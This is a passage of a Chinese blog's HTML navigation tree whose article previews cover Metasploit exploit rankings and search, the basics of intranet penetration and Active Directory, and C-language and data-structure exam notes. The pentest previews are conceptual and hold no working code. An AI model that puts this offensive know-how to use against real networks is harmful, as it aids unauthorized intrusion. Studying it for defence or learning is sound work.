+Rank 的值可以是下面的表格中的其中之一，按照可靠性降序排列
+Ranking Description ExcellentRanking 漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入，命令执行，远程文件包含，本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别。（WMF Escape()） GreatRanking 该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定于应用的返回地址。（译者注：有些二进制的漏洞利用成功后，需要特别设置 Shell 退出后的返回地址，否则当 Shell 结束后，目标服务器会崩溃掉。） GoodRanking 该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”（英文，桌面应用程序的Windows 7，服务器的2012等常用） NormalRanking 该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。 AverageRanking 该漏洞利用程序不可靠或者难以利用。 LowRanking 对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于 50% 的利用成功率） ManualRanking 该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。（例如：exploit/unix/webapp/php_eval） search搜索 已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索
+">MSF&amp;CS介绍与使用</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="内网渗透-AD域基础知识 简介 内网也指局域网，是一个封闭的网络空间
+内网渗透（intranet exploitation）是对目标服务器getshell后，通过一系列技术手段对其所处的内网环境进行渗透，最终获取内网其他主机的权限的过程，这些通常涉及以下技术：
+内网信息收集 内网代理 权限提升 横向移动 &amp;amp;hellip;&amp;amp;hellip; 基本概念 工作组（work group） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为WORKGROUP
+简单来说，就是将不同的计算机按照功能或部门分别置于不同的组，适用于网络中计算机不多、资产规模较小、对安全管理控制要求不严格的情况，这是一种松散的资源管理模式，任何人都可以在局域网中创建新的工作任务而无需管理员同意，换言之，处于同一工作组中的主机彼此间地位平等，不存在额外关联或管理关系，对于此类情况，在内网渗透时需要逐个渗透与控制
+在局域网内，计算机默认都是按照工作组的方式进行资源管理的
+优点： 方便管理和维护 资源分配方便和灵活 缺点： 缺乏集中管理与控制的机制 没有集中的统一账户管理 只适合小规模用户的使用 域（domain） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为类似域名格式，由“.”连接的字符串
+当组织中网络规模越来越大时，需要统一的管理和集中的身份验证，并能为用户提供更加方便地的网络资源搜索和使用方式时，就需要放弃工作组而使用域
+域是一种比工作组更高级的的计算机资源管理模式，在域环境中，所有用户账户、用户组、计算机、打印机和其他安全主体都在一个或多个域控制器的中央数据库中注册；当域用户想访问域中的资源时，必须通过域控制器集中进行身份验证，通过身份验证的域用户在域中的身份决定了域用户对域中资源的访问权限
+在域环境中，域管理员用户在域中具有最高访问权限和最高管理权限，在渗透过程中，获取域管理员相关权限往往可以控制整个域控
+单域
+指网络环境中只有一个域
+父域和子域
+某些情况下，需要在一个域中分出多个域，被划分的域称为父域，划分出来的域被称为子域，每个子域都拥有自己的安全策略，在有信任的情况下，父域可以访问子域
+从域名上看，子域是域名中的一个段，用“.”进行域名分割，一个“.”代表域名的一个层级
+域树
+域树是多个域通过建立信任关系组成的一个域集合
+在域树中，所有的域共享同一表结构和配置，所有域名形成一个连续的名字空间，该命名空间具有连续性，域名层次越深，级别越低
+在域树中，域管理员只能管理本域，不能访问或管理其他域，如果两个域之间要互相访问，就需要建立信任关系（trust relation）
+域林
+指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的域树集合，域林中所有域树共享同一个表结构、配置和全局目录
+域控制器 域控制器（Domain Controller，DC）简称域控，是域环境核心的服务器计算机，用于在域中响应安全身份认证请求，负责允许或拒绝发出请求的主机访问域内资源，以及对用户进行身份验证、存储用户账户信息并执行域的安全策略等，域控包含一个活动目录数据库，其中存储着整个域的账户、密码、计算机等信息，而前面提到的身份验证便主要有以下步骤：
+该计算机是否属于本域 登录账号是否存在 密码是否正确 一个域环境可以拥有一台或多台域控制器，每台域控都各自存储了一份所在域的活动目录AD的可写副本，对AD的修改都可以从源域控同步复制到域、域树或域林的其他控制器上，这样即使其中一台域控瘫痪，另一台域控也可以继续工作，保证域环境正常运行
+一般情况下，DC也会被作为DNS服务器使用
+域环境搭建 主机准备 我准备了三台主机
+windows server 2019 datacenter windows 10 pro x64 windows 10 pro x64 配置域控 配置静态IP 打开控制面板中的网络设置，将IP配置为静态的192.168.111.100：
+">内网渗透基础知识</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>考研</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>C语言</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/c%E8%AF%AD%E8%A8%80/%E8%80%83%E7%A0%94%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%B8%8B/" class="article-link" data-summary="考研视角下的C语言(下) 第十二章_指针 指针是什么？指针保存的是一个地址，是用于存放内存地址的变量，它指向某个对象在内存中的起始地址（首地址）。
+12.1 指针变量的初始化 指针变量是依附于另外一个目标而存在的，所以先要给目标申请内存，再来创建一个指针变量。而我们都知道，指针变量存放的是目标在内存中的首地址，为了确定目标的实际大小，所以在创建指针变量的时候还需要确定基类型，以方便编译器在解引用和指针运算时确定访问的字节数。 这里解释下上面例子中出现的两个运算符：
+解引用符号 * ： 和 = 与 [] 类似，在不同的地方符号的含义不同，在“类型声明”里表示“指针类型”，在“表达式”里表示乘法和根据指针变量存储的地址值和指针的基类型取指向地址里的值 取地址符号 &amp;amp;amp; ： 在声明中只作为类型的一部分或语法连接符出现，本身不表示运算，在表达式里表示 “取某个对象的首地址”（生成一个指针值） 12.2 指针变量的使用 C语言中的指针存在非常多的用法，但是对于初学者来说，只用掌握两种就好了，即指针的传递和指针的偏移：
+12.2.1 指针的传递 指针的传递能够用来在被调函数的栈帧里修改主调函数栈帧的数据：
+主调函数给被修改的数据申请内存 被调函数以数据的指针作为参数 被调函数用解引用运算符去间接访问内存，修改内容 #define _CRT_SECURE_NO_WARNINGS #include &amp;amp;lt;stdio.h&amp;amp;gt; void swap(int *pa, int *qb) { int temp = *pa; *pa = *qb; *qb = temp; } int main() { int a = 5, b = 10; printf(&amp;amp;#34;swap函数调用前a=%d，b=%d\n&amp;amp;#34;, a, b); int *pa = &amp;amp;amp;a; int *qb = &amp;amp;amp;b; swap(pa, qb); printf(&amp;amp;#34;swap函数调用后a=%d，b=%d\n&amp;amp;#34;, a, b); return 0; } 12.2.2 指针的偏移 所谓指针的偏移就是对指针的变量做加减法（只能加减整数），实现连续内存单元的访问，通常和数组联系在一起。公式如下：
+指针p &#43; n = p里存储的地址 &#43; n * 基类型的大小 和之前讲的 [ ] 运算符很相似 12.2.3 指针的使用原则 指针的使用原则只有一个：先考虑目标是否存在，再使用指针。 比如下面这段代码，结合 10.2 函数运行的内存原理，10.4 生存期，其实这个局部数组在函数调用完成之后就被销毁了，那指向他的指针解引用也自然会出错： ">考研视角下的C语言(下)</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/c%E8%AF%AD%E8%A8%80/%E8%80%83%E7%A0%94%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%B8%AD/" class="article-link" data-summary="考研视角下的C语言(中) 第七章_选择结构 7.1 if 的用法 单分支结构（if）：只有在条件为真时执行语句。 单分支结构（if）：只有在条件为真时执行语句。 多分支结构（if &#43; else if &#43; else）：用于多个条件的判断，依次匹配第一个为真的分支。 if 的分支结构用法如下：
+#define _CRT_SECURE_NO_WARNINGS #include &amp;amp;lt;stdio.h&amp;amp;gt; int main() { int score; printf(&amp;amp;#34;请输入分数：&amp;amp;#34;); scanf(&amp;amp;#34;%d&amp;amp;#34;, &amp;amp;amp;score); //if 和 else 后面不加 {} 匹配的都是单行语句，即使后面是单行语句建议还是加上 {} // --- 单分支：判断是否及格 --- if (score &amp;amp;gt;= 60) { printf(&amp;amp;#34;及格了！\n&amp;amp;#34;); } // --- 双分支：判断是否优秀 --- if (score &amp;amp;gt;= 90) { printf(&amp;amp;#34;优秀！\n&amp;amp;#34;); } else { printf(&amp;amp;#34;不是优秀。\n&amp;amp;#34;); } // --- 多分支：判断具体等级 --- if (score &amp;amp;gt;= 90) { printf(&amp;amp;#34;等级：A\n&amp;amp;#34;); } else if (score &amp;amp;gt;= 75) { printf(&amp;amp;#34;等级：B\n&amp;amp;#34;); } else if (score &amp;amp;gt;= 60) { printf(&amp;amp;#34;等级：C\n&amp;amp;#34;); } else { printf(&amp;amp;#34;等级：D\n&amp;amp;#34;); } return 0; } else 就近原则总结（重要！易错点）： 在C语言中else 永远匹配最近的、没有配对的 if，不是匹配上面缩进对齐的 if，别和python搞混了
+">考研视角下的C语言(中)</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/c%E8%AF%AD%E8%A8%80/%E8%80%83%E7%A0%94%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%B8%8A/" class="article-link" data-summary=" 考研视角下的C语言(上) 当你想准备考研408，C语言就成了你绕不过去的专业课门槛，在考研中的复习C语言是复习408专业课的第一步， 区别于我们在大一学习的C语言，考研的C语言只需要学习到链表部分，但对在C语言的视角下对计算机的理解更加深入，以下内容仅适合有一些基础的同学，现将C语言重要知识点按照章节总结如下： 第一章_配置C语言开发环境 大一的时候应该配置过，我使用的是VS2022,具体配置与使用可参考如下文章。
+https://blog.csdn.net/Daears/article/details/126359972 https://blog.csdn.net/2401_87692645/article/details/148870278
+第二章_程序员视角中的计算机 2.1 如何设置断点进行程序的调试 如图所示，只用保留这几个窗口即可（打断点后F5即可跳转调试界面，然后手动在 调试-&amp;amp;gt;窗口 中设置需要的窗口，比如图中的内存窗口），该技巧会在考研学习的过程中不断地用到。 2.2 内存模型 在程序员的视角中看计算机，无非就两个东西，CPU和存储器，接下来介绍一个非常重要的存储器&amp;amp;ndash;内存。
+在vs2022的内存视角中有三列数据，第三列是把第二列的 16 进制数据转换成对应的 ASCII 字符（无法映射的字符用./?表示），不想管可以先不管。
+实际的内存模型只包含前面两列数据，内存地址和内存数据，一个内存单元占一个字节，下图第一列显示的都是多个连续的内存单元的起始地址，第二列显示的是连续存储的数据。 地址的二进制位数（宽度）直接决定了能表示的最大地址数量，进而决定了可访问的内存空间总大小
+32 位地址（32 位 CPU / 操作系统）总内存空间：2^32 字节 = 4GB（理论上限）
+64 位地址（当前主流 CPU / 操作系统）总内存空间：2^64 字节 = 16EB（理论上限）
+现目前的CPU只实现了 48 位地址线：2^48 字节 = 256TB （硬件上限）
+我们平常使用的电脑内存只有十几GB,主要是内存条贵和够用多方面原因。
+第三章_基础语法 3.1 空白字符 空白字符有三种：空格，制表符，换行。空白字符不会影响代码的结构，只是起到一个分隔的作用，即使你写成下图这样，在C语言中也能够进行编译。 3.2 注释 行注释：// //这是一行注释
+段注释：/**/ /*这是一\n段注释*/
+3.3 关键字和标识符 关键字：诸如 int return 等32个，为C语言定义好的，不能把这些当做标识符，大小写敏感
+标识符：以数字，下划线，字母组成（不能以数字开头，不能和关键字重复，大小写敏感），用于标识你自己定义的变量等，比如 Int,Return,_int 等。
+第四章_常量，变量和数据类型 4.1 字面值常量 4.1.1 定义 字面型常量 = 程序中直接写出来、值不会改变的量，写出来就知道是什么意思。
+">考研视角下的C语言(上)</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>数据结构</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%8E%92%E5%BA%8F/" class="article-link" data-summary="数据结构之排序 第八章_排序 8.1 排序的基本概念 排序就是将表中的元素重新排列，使其按关键字有序的过程，也方便了后序的查找操作。
+算法的稳定性： 算法的稳定性不能用来衡量算法的优劣（不同场景需求不同）。衡量排序算法的性能指标主要是时间复杂度和空间复杂度，其概念如下图所示： 排序算法的分类：
+内部排序： 所有的元素都能放进内存中。 外部排序： 数据太多无法放入内存中，需要频繁在内、外存之间交换数据。 示意图如图所示： 这里推荐 旧金山大学(University of San Francisco) 开发的一个神奇的学习网站（末尾链接），可可视化查看各种算法。
+8.2 插入排序 这是一种简单直观的算法，其基本思想是：每次将一个待排序的记录，按其关键字大小插入到前面已经排好序的子序列中。
+8.2.1 直接插入排序 实现代码如下：
+//普通实现方式 void InsertSort(int A[], int n) { int i, j; for (i = 1; i &amp;amp;lt; n; i&#43;&#43;) { if (A[i] &amp;amp;lt; A[i - 1]) { int temp = A[i]; for (j = i - 1; j &amp;amp;gt;= 0 &amp;amp;amp;&amp;amp;amp; A[j] &amp;amp;gt; temp; j--) { A[j &#43; 1] = A[j]; } A[j &#43; 1] = temp; } } } //直接插入排序（带哨兵） void InsertSort(int A[], int n){ int i, j; for(i=2; i&amp;amp;lt;=n; i&#43;&#43;) //依次将A[2]~A[n]插入到前面已排序序列 if(A[i]&amp;amp;lt;A[i-1]){ //若A[i]关键码小于其前驱，将A[i]插入有序表 A[0]=A[i]; //复制为哨兵，A[0]不存放元素 for(j=i-1; A[0]&amp;amp;lt;A[j]; --j)//从后往前查找待插入位置 A[j&#43;1]=A[j]; //向后挪位 A[j&#43;1]=A[0]; //复制到插入位置 } } 对于直接插入排序性能分析如下：
+空间效率： 空间复杂度 O(1)。
+时间效率：
+最坏时间复杂度：时间复杂度为 O(n2)，发生 n (n - 1) / 2 即原始数据全部逆序的情况。 最好时间复杂度：时间复杂度为 O(n)，比较次数为 n - 1 次，即原始数据全部有序的情况。 平均时间复杂度：O(n2) 稳定性： 相同关键字的元素的相对顺序不会改变，直接插入排序是稳定的算法。
+">数据结构之排序</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%9F%A5%E6%89%BE/" class="article-link" data-summary="数据结构之查找 第七章_查找 7.1 查找的基本概念 查找：在数据集合中寻找满足某种条件的数据元素的过程称为查找 查找表（查找结构）：用于查找的数据集合称为查找表，它由同一类型的数据元素（或记录）组成，不一定只用于查找，还可用于增加/删除等操作。查找表并不是一个单一的数据结构，可以是图、树、线性表&amp;amp;hellip; 关键字：数据元素中唯一标识该元素的某个数据项的值，使用基于关键字的查找，查找结果应该是唯一的。 静态查找表： 查找表在使用期间数据元素固定不变，仅支持查找操作，不进行频繁的插入或删除。 动态查找表： 查找表在使用期间数据元素可以动态增加或删除，支持查找、插入和删除等操作。 查找长度： 在查找运算中，需要对比关键字的次数称为查找长度 平均查找长度（ASL, Average Search Length）： 所有查找过程中进行关键字的比较次数的平均值，ASL 是各元素查找长度与其被查找概率（默认各元素相同）的加权平均值，其数学定义为： $$ \text{ASL} = \sum_{i=1}^{n} L_i \cdot p_i $$ 默认情况为： $$ \text{ASL} = \frac{1}{n} \sum_{i=1}^{n} L_i $$ 查找表中有 n 个元素，第 i 个元素查找长度为 Li ，查找概率为 Pi（各元素之和为 1），ASL 是衡量查找算法效率的核心指标。 7.2 线性表查找 线性表查找指 “查找表” 是线性表的查找。
+7.2.1 顺序查找 所谓顺序查找，就是我们最熟悉的从头到尾去挨个匹配关键字。
+7.2.1.1 一般顺序查找 普通顺序查找的实现方式很简单，代码如下：
+typedef struct{ ElemType *elem; //这里可以用动态数组的方式实现，省略了一些代码 int TableLen; }SSTable; //顺序查找 int Search_Seq(SSTable ST,ElemType key){ int i; for(i=0;i&amp;amp;lt;ST.TableLen &amp;amp;amp;&amp;amp;amp; ST.elem[i]!=key; &#43;&#43;i); //判断是否越界，判断是否查找成功 //查找成功，则返回元素下标；查找失败，则返回-1 return i==ST.TableLen? -1 : i; } 7.2.1.2 哨兵模式顺序查找 我们将待查找的关键字放在数组下标为 0 的位置，数据从下标为 1 的位置开始存储，从后往前顺序查找。这样便不用每次都判断是否越界，因为遍历到下标为 0 的位置会自动停下来。我们将下标为 0 位置对应元素称之为哨兵，实现代码如下：
+">数据结构之查找</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%9B%BE/" class="article-link" data-summary="数据结构之图 第六章_图 6.1 图的基本概念 图 G 由顶点集 V（vertex） 和边集 E（edge） 组成，记为 G = (V,E)。若 V = {v1,v2,v3&amp;amp;hellip;vn}，则用 |v| 表示图 G 中顶点的数量；若 E = {(u,v)|$u \in V$,$v \in V$}，则用 |E| 表示图 G 中边的数量。
+注意：线性表能够是空表，树能够是空树，但是图不能是空图，顶点集必须非空，边集可以为空。在图中，每一条边都必须依附于两个顶点；而顶点可以不与任何边相连（称为孤立顶点）。
+6.2 图的基本术语 很杂，思维导图如下： 6.2.1 有向图和无向图 弧头弧尾别搞反了！箭头那头是弧头！！ 6.2.2 简单图和多重图 6.2.3 顶点 关于顶点主要就是顶点的度、入度和出度。 在无向图中：顶点的度是指依附于该顶点的边的数量（无入度和出度之分），记为 TD(v)。全部顶点的度数之和等于边数的两倍。 在有向图中：顶点的度分为入度和出度，入度就是该点是多少个弧头，记为 ID(v)，出度就是该点是多少个弧尾，记为 OD(v)。当然 TD(v) = ID(v) &#43; OD(v)。 6.2.4 边的权，带权图 / 网 边上带权值的图被称为带权图，也称为网。 6.2.5 点与点间的关系 6.2.5.1 一堆描述 好杂啊，没事过来看看.. 6.2.5.2 连通图与强连通图 注意在无向图中才讨论连通性，在有向图中才考虑强连通性。 6.2.6 图的局部 6.2.6.1 子图 注意划分的子图，一定要是个图。 ">数据结构之图</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/" class="article-link" data-summary="数据结构之树与二叉树 第五章_树与二叉树 5.1 树 5.1.1 树的定义 树是 n (n&amp;amp;gt;=0) 个结点的有限集。当 n 等于 0 时，称作空树
+树属于数据结构三要素中：逻辑结构 → 非线性结构 → 树形结构。在任意一棵非空树中必须满足：
+有且仅有一个特定的结点称作根结点。 当 n &amp;amp;gt; 1 时，除根结点的其余结点可分为 m（m&amp;amp;gt;0）个互不相交的有限集，其中每个集合本身又是一棵树，称为根的子树。 显然非空树是递归定义的。（每个子树本身又是一棵树，用树来定义树，典型的递归定义），而更具以上定义我们能推出以下两个特征：
+根结点没有前驱，除根结点外的每个结点都有且仅有一个前驱 每个结点都可能有零个或者多个后继结点。 错误示意如下： 5.1.2 树的基本术语 祖先，子孙，双亲，孩子，兄弟和堂兄弟结点： 从根结点到该结点路径上的所有结点（不包括该结点本身），称为该结点的祖先结点。某结点的所有后代结点，称为该结点的子孙结点。
+结点的层次，深度和高度： 结点的层次从根开始定义，根为第一层，其孩子结点为第二层，以此类推。结点的深度即为其所在的层次。结点的高度是以其为根的子树的高度，如上图树的高度为。 路径和路径长度： 路径是指从一个结点到另一个结点，沿父子关系依次经过的结点序列（包括起始和结束结点）。路径长度是路径上边的数目。（路径是没有方向的，但是涉及到层次，深度，高度等概念时，默认是从上到下，而此时不考虑从下到上的路径） 结点的度和树的度： 树中一个结点的孩子结点的个数称为结点的度。树中所有结点的度的最大值称为树的度。结点的度为 0 的结点为叶结点，结点的度 &amp;amp;gt;0 的结点为分支结点（包括根结点） 有序树和无序树： 具体要看用树来存储些什么，各结点的子树从左到右是否存在逻辑次序关系，存在即为有序树，反之则为无序树。 森林： 森林是 m（m &amp;amp;gt;= 0）个不相交的树的集合。m = 0 时的情况叫做空森林。与树的概念密切相关。把树的根结点移除，其子树构成森林；给森林加一个根结点，森林便转化为一棵树。
+5.1.3 树的性质（常考点） 下面介绍几个在考研中常考的性质：
+树的结点的个数 = 树的总度数 &#43; 1 （根结点） 树的度为 m 和 m 叉树的区别（m &amp;amp;gt;= 1)：树的度为 m 代表至少有 m&#43;1 个结点（一定非空树），且至少有一个结点的度为 m 所有结点的度都 &amp;amp;lt;= m；m 叉树代表可以为空树，允许所有结点的度 &amp;amp;lt;= m。 m 叉树和树的度为 m 的第 i 层都最多有 m i-1 个结点。 高度为 h 的 m 叉树的最多有 (m h - 1) / (m - 1) 个结点（等比数列求和） 高度为 h 的 m 叉树至少有 h 个结点，高度为 h 的度为 m 的树至少有 h &#43; m - 1个结点。 具有 n 个结点的 m 叉树的最小高度为 $$ h = \left\lceil \log_{m}\bigl(n(m-1)&#43;1\bigr) \right\rceil $$ 即要求最小的整数 ( h )，使得
+$$ \frac{m^{,h-1}-1}{m-1} &amp;amp;lt; n \le \frac{m^{,h}-1}{m-1} $$ 5.2 二叉树 5.2.1 二叉树的概念 二叉树是一种特殊的树形结构，是包含 n （n &amp;amp;gt;= 0）个结点的有限集合，其核心特征在于：每个结点至多拥有两棵子树。
+">数据结构之树与二叉树</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E4%B8%B2/" class="article-link" data-summary="数据结构之串 第四章_串 4.1 串的定义 串（string） 是由零个或多个字符组成的有限序列（就是我们常说的字符串）通常记为：
+S = &amp;#39;a₁ a₂ … aₙ&amp;#39;（n ≥ 0）
+其中，S 是串名，单（双）引号括起的字符序列是串的值（单双引号取决于语言，比如python用单引号，C语言用双引号），每个 aᵢ 可以是字母、数字或其他字符，串中字符的个数 n 称为串的长度，当 n = 0 时，该串称为空串，用 ∅ 表示。
+实际上串也是一种特殊的线性表，其特殊性体现在：串的元素类型限定为字符，且其基本运算主要是子串操作（如模式匹配），而不是一般线性表的插入和删除操作。 下面是子串相关的定义，用举例说明：
+S=&amp;amp;#34;HelloWorld!&amp;amp;#34; T=&amp;amp;#39;iPhone 18 Pro Max?&amp;amp;#39; 子串： 串中任意个连续的字符组成的子序列（可以等于主串）。 Eg: &amp;amp;lsquo;iPhone&amp;amp;rsquo;, &amp;amp;lsquo;Pro M&amp;amp;rsquo; 是串 T 的子串 主串： 包含子串的串。 Eg: T 是子串 &amp;amp;lsquo;iPhone&amp;amp;rsquo; 的主串 字符在主串中的位置： 字符在串中的序号。 Eg: &amp;amp;lsquo;8&amp;amp;rsquo; 在 T 中的位置是 9 （注意这里指的是位序） 子串在主串中的位置： 子串的第一个字符在主串中的位置。 Eg: &amp;amp;lsquo;11 Pro&amp;amp;rsquo; 在 T 中的位置为 8 （注意这里指的是位序）
+4.2 串的基本操作 串的基本操作不做过多解释，基本和平常使用的C语言中string库中函数的作用相同，其函数规范如下：
+StrAssign (&amp;amp;amp;T,chars): 赋值操作。把串 T 赋值为 chars。 StrCopy (&amp;amp;amp;T,S): 复制操作。由串 S 复制得到串 T。 StrEmpty (S): 判空操作。若 S 为空串，则返回 TRUE，否则返回 FALSE。 StrLength (S): 求串长。返回串 S 的元素个数。 ClearString (&amp;amp;amp;S): 清空操作。将 S 清为空串（逻辑上清空，并没有回收空间）。 DestroyString (&amp;amp;amp;S): 销毁串。将串 S 销毁（回收存储空间）。 Concat (&amp;amp;amp;T,S1,S2): 串联接。用 T 返回由 S1 和 S2 联接而成的新串 SubString (&amp;amp;amp;Sub,S,pos,len): 求子串。用 Sub 返回串 S 的第 pos 个字符起长度为 len 的子串。 Index (S,T): 定位操作。若主串 S 中存在与串 T 值相同的子串，则返回它在主串 S 中第一次出现的位置；否则函数值为 0。 StrCompare (S,T): 比较操作。若 S&amp;amp;gt;T，则返回值 &amp;amp;gt; 0；若 S=T，则返回值 = 0；若 S &amp;amp;lt; T，则返回值 &amp;amp;lt; 0。 4.3 串的存储结构 既然是串是一种特殊的线性表，其实现方式我们自然能想到两种即顺序存储和链式存储：
+">数据结构之串</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%88%E9%98%9F%E5%88%97%E5%92%8C%E6%95%B0%E7%BB%84/" class="article-link" data-summary="数据结构之栈、队列和数组 第三章_栈、队列和数组 本章介绍的两种数据结构栈和队列在逻辑结构上都属于线性结构，只不过是操作受限的线性表。
+3.1 栈 3.1.1 栈的基本概念 栈（stack） 是仅允许在一端进行插入和删除操作的线性表。
+在写C语言时，函数销毁创建本质就是依赖于栈这一数据结构。特点是后进先出（Last In First Out，LIFO） 下面介绍栈的三个基本属性以及示意图：
+栈顶（Top）： 允许进行插入和删除操作的这一端。 栈底（Bottom）： 固定不变，不允许进行插入和删除操作的这一端。 空栈： 不含任何元素的栈。 3.1.2 栈的基本操作 采用严蔚敏版的命名规范：
+InitStack(&amp;amp;amp;S)：初始化一个空栈S。 DestroyStack(&amp;amp;amp;S)：销毁栈S，释放其存储空间。 Pop(&amp;amp;amp;S,x)：入栈操作，若栈未满，则x成为新的栈顶元素。 Push(&amp;amp;amp;S,x)：出栈操作，若栈非空，则弹出栈顶元素，并通过x返回该值。 GetTop(S,&amp;amp;amp;x)：读取栈顶元素但不出栈，若栈非空，则通过x返回值。 StackEmpty(S)：判断栈是否为空，为空返回True，否则返回False。 3.1.3 栈的数学性质 栈的数学性质： 当n个不同的元素按固定次序入栈时，可能的出栈序列的总数为 1/(n&#43;1)Cn2n，该数列也被称为卡特兰数。（做题时很好用）
+3.1.4 顺序栈 3.1.3.1 顺序栈的定义 采用顺序存储的栈称为顺序栈，它利用一组连续的存储单元存放从栈顶到栈底的数据元素，并附设一个整型指针（top） 指向当前栈顶元素位置。
+与线性表类似，栈也有两种基本的存储方式：顺序存储和链式存储。
+3.1.3.2 顺序栈的实现和基本操作 下面介绍顺序栈。基于top指针的指向方式，栈其实存在两种操作方式：1. top 表示当前栈顶元素的下标，2. top 表示“下一个可存放元素的位置”。由于和《数据结构之绪论与线性表》中的代码大致都相同，也很简单，这里直接用代码说明顺序栈的实现和基本操作。
+1. top 表示当前栈顶元素的下标: 注意top指针在这种情况下初始化为 -1。在做题时，S.data[&#43;&#43;top]; 等代码的 &#43;&#43;top 和 top&#43;&#43;，两种情况表示不同，一定理解记忆是哪种情况。
+#define _CRT_SECURE_NO_WARNINGS #include &amp;amp;lt;stdio.h&amp;amp;gt; #include &amp;amp;lt;stdlib.h&amp;amp;gt; # define MaxSize 50 typedef struct { Elemtype data[MaxSize]; int top; }SqStack; void InitStack(SqStack&amp;amp;amp; S) { S.top = -1; //注意这里初始化为-1 } bool StackEmpty(SqStack &amp;amp;amp;S) { if (S.top == -1) { return true; } return false; } bool Push(SqStack &amp;amp;amp;S, Elemtype x) { if (S.top == MaxSize - 1) { //栈满，不能插入 return false; } //下面两行等价于S.data[&#43;&#43;top]=x; 做题时注意区分 S.top&#43;&#43;; S.data[S.top] = x; return true; } bool Pop(SqStack&amp;amp;amp; S, Elemtype &amp;amp;amp;x) { if (S.top == -1) { //栈为空，无法删除 return false; } x = 